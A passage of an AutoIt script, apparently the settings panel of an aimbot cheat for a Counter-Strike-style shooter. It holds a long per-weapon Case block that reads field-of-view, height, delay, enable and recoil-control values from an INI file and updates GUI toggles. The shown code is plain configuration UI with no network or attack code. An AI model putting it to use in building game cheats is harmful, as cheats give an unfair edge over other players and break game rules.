						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_bizon.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "sg553"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_sg553.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_sg553.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_sg553.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_sg553.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_sg553.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "fiveseven"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_fiveseven.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_fiveseven.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_fiveseven.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_fiveseven.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_fiveseven.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "glock"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_glock.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_glock.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_glock.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_glock.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_glock.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "p228"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_p228.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_p228.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_p228.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_p228.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_p228.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "p250"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_p250.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_p250.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_p250.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_p250.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_p250.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "usp"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_usp.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_usp.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_usp.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_usp.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_usp.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "famas"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_famas.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_famas.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_famas.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_famas.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_famas.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "ak47"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_ak47.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_ak47.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_ak47.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_ak47.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_ak47.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "nova"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_nova.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_nova.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_nova.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_nova.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_nova.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "mag7"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_mag7.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_mag7.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_mag7.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_mag7.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_mag7.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "ump45"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_ump45.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_ump45.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_ump45.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_ump45.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_ump45.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "mp7"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_mp7.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_mp7.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_mp7.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_mp7.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_mp7.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "m4a1"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_m4a1.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_m4a1.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_m4a1.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_m4a1.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_m4a1.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "galil"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_galil.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_galil.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_galil.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_galil.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_galil.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "galilar"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_galilar.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_galilar.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_galilar.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_galilar.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_galilar.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "aug"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_aug.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_aug.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_aug.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_aug.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_aug.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "scar20"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_scar20.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_scar20.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_scar20.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_scar20.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_scar20.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "awp"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_awp.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_awp.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_awp.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_awp.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_awp.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "g3sg1"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_g3sg1.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_g3sg1.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_g3sg1.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_g3sg1.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_g3sg1.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "m249"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_M249.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_m249.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_m249.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_m249.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_m249.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "m3"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_m3.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_m3.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_m3.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_m3.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_m3.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "mp5navy"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_mp5navy.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_mp5navy.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_mp5navy.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_mp5navy.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_mp5navy.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "scout"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_scout.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_scout.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_scout.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_scout.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_scout.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "sg550"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_sg550.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_sg550.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_sg550.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_sg550.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_sg550.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "sg552"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_sg552.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_sg552.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_sg552.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_sg552.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_sg552.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "tmp"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_tmp.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_tmp.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_tmp.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_tmp.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_tmp.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "xm1014"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_xm1014.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_xm1014.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_xm1014.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_xm1014.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_xm1014.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "negev"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_negev.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_negev.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_negev.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_negev.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_negev.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "sawedoff"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_sawedoff.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_sawedoff.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_sawedoff.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_sawedoff.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Aimon, @TempDir & "\Disable.bmp")
					EndIf
					$readrcsvalue = IniRead($FileSet, "WeaponSettings", "aimbot_sawedoff.rcs", 0)
					If $readrcsvalue = 1 Then
						GUICtrlSetImage($RCSon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($RCSon, @TempDir & "\Disable.bmp")
					EndIf

				Case "tec9"
					$readfovvalue = IniRead($FileSet, "WeaponSettings", "aimbot_tec9.fov", 0)
					GUICtrlSetData($menufov, $readfovvalue)
					$readheightvalue = IniRead($FileSet, "WeaponSettings", "aimbot_tec9.height", 0)
					GUICtrlSetData($menuheight, $readheightvalue)
					$readdelayvalue = IniRead($FileSet, "WeaponSettings", "aimbot_tec9.delay", 0)
					GUICtrlSetData($menudelay, $readdelayvalue)
					$readenablevalue = IniRead($FileSet, "WeaponSettings", "aimbot_tec9.enabled", 0)
					If $readenablevalue = 1 Then
						GUICtrlSetImage($Aimon, @TempDir & "\Active.bmp")
					Else
